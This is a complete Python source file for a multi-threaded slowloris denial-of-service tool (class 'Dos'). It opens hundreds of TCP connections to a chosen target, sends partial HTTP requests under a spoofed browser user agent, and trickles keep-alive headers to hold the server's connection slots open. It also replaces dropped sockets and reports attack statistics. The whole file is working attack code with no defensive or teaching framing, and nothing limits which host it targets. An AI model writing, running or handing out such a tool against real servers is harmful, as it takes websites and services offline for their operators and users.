from __future__ import annotations
import random
import socket
import threading
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional


DEFAULT_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)


@dataclass
class DosStats:
    alive_sockets: int = 0
    opened: int = 0
    closed: int = 0
    threads_active: int = 0
    started_at: Optional[float] = None
    running: bool = False
    errors: Dict[str, int] = field(default_factory=dict)


class Dos:
    """
    Multi-threaded slowloris against a TCP target.

    Each worker opens an initial pool of TCP connections, sends a partial
    HTTP/1.1 request, then keeps connections alive with periodic partial
    headers. Dead sockets are replaced to keep the pool stable.
    """

    MAX_TOTAL_SOCKETS = 20000
    STARTUP_DELAY = 0.01

    def __init__(
        self,
        target_ip: str,
        target_port: int = 80,
        threads: int = 10,
        sockets_per_worker: int = 50,
        keepalive_interval: float = 15.0,
        connect_timeout: float = 5.0,
        max_total_sockets: int = MAX_TOTAL_SOCKETS,
    ) -> None:
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = max(1, threads)
        self.sockets_per_worker = max(1, sockets_per_worker)
        self.keepalive_interval = max(0.1, keepalive_interval)
        self.connect_timeout = connect_timeout

        total = self.threads * self.sockets_per_worker
        if total > max_total_sockets:
            raise ValueError(
                f"Total sockets ({total}) exceeds safety cap "
                f"({max_total_sockets}). Reduce threads or sockets_per_worker."
            )

        self._sockets: List[socket.socket] = []
        self._lock = threading.Lock()
        self._stop = threading.Event()
        self._workers: List[threading.Thread] = []
        self._stats = DosStats()
        self._send_counter = 0

    @property
    def sockets_per_thread(self) -> int:
        return self.sockets_per_worker

    def _record_error(self, kind: str) -> None:
        with self._lock:
            self._stats.errors[kind] = self._stats.errors.get(kind, 0) + 1

    def _open_one(self) -> Optional[socket.socket]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.connect_timeout)
            s.connect((self.target_ip, self.target_port))
            s.send(f"GET /?{random.randint(0, 2**31)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {self.target_ip}\r\n".encode())
            s.send(f"User-Agent: {DEFAULT_USER_AGENT}\r\n".encode())
            s.send(b"Accept-Language: en-US,en\r\n")
            return s
        except socket.timeout:
            self._record_error("timeout")
            return None
        except ConnectionRefusedError:
            self._record_error("refused")
            return None
        except ConnectionResetError:
            self._record_error("reset")
            return None
        except OSError as e:
            self._record_error(type(e).__name__)
            return None
        except Exception:
            self._record_error("other")
            return None

    def _open_sockets(self, count: int) -> int:
        opened = 0
        for _ in range(count):
            if self._stop.is_set():
                break
            s = self._open_one()
            if s is not None:
                with self._lock:
                    self._sockets.append(s)
                opened += 1
        with self._lock:
            self._stats.opened += opened
        return opened

    def _open_initial_pool(self) -> int:
        return self._open_sockets(self.sockets_per_worker)

    def _keepalive_send(self, s: socket.socket) -> None:
        with self._lock:
            self._send_counter += 1
            n = self._send_counter
        s.send(f"X-Keepalive-{n}: a\r\n".encode())

    def _worker(self) -> None:
        self._open_initial_pool()
        with self._lock:
            self._stats.threads_active += 1

        try:
            while not self._stop.is_set():
                dead: List[socket.socket] = []
                with self._lock:
                    current = list(self._sockets)

                for s in current:
                    try:
                        self._keepalive_send(s)
                    except Exception:
                        dead.append(s)

                if dead:
                    with self._lock:
                        for s in dead:
                            if s in self._sockets:
                                self._sockets.remove(s)
                            try:
                                s.close()
                            except Exception:
                                pass
                        self._stats.closed += len(dead)
                    self._open_sockets(len(dead))

                with self._lock:
                    self._stats.alive_sockets = len(self._sockets)

                self._stop.wait(self.keepalive_interval)
        finally:
            with self._lock:
                self._stats.threads_active -= 1

    def run(self) -> None:
        self._stop.clear()
        self._stats.started_at = time.time()
        self._stats.running = True
        self._stats.opened = 0
        self._stats.closed = 0
        self._stats.alive_sockets = 0
        self._stats.threads_active = 0
        self._stats.errors = {}
        self._send_counter = 0

        self._workers = []
        for i in range(self.threads):
            t = threading.Thread(
                target=self._worker,
                name=f"dos-{i:02d}",
                daemon=True,
            )
            t.start()
            self._workers.append(t)
            if i < self.threads - 1:
                time.sleep(self.STARTUP_DELAY)

    def stop(self, join_timeout: float = 5.0) -> None:
        self._stop.set()
        with self._lock:
            for s in self._sockets:
                try:
                    s.close()
                except Exception:
                    pass
            self._sockets.clear()
        self._stats.running = False
        self._stats.alive_sockets = 0

        per_thread = join_timeout / max(len(self._workers), 1)
        for t in self._workers:
            t.join(timeout=per_thread)

    def stats(self) -> dict:
        with self._lock:
            return {
                "alive_sockets": self._stats.alive_sockets,
                "opened": self._stats.opened,
                "closed": self._stats.closed,
                "threads_active": self._stats.threads_active,
                "started_at": self._stats.started_at,
                "running": self._stats.running,
                "target": f"{self.target_ip}:{self.target_port}",
                "errors": dict(self._stats.errors),
            }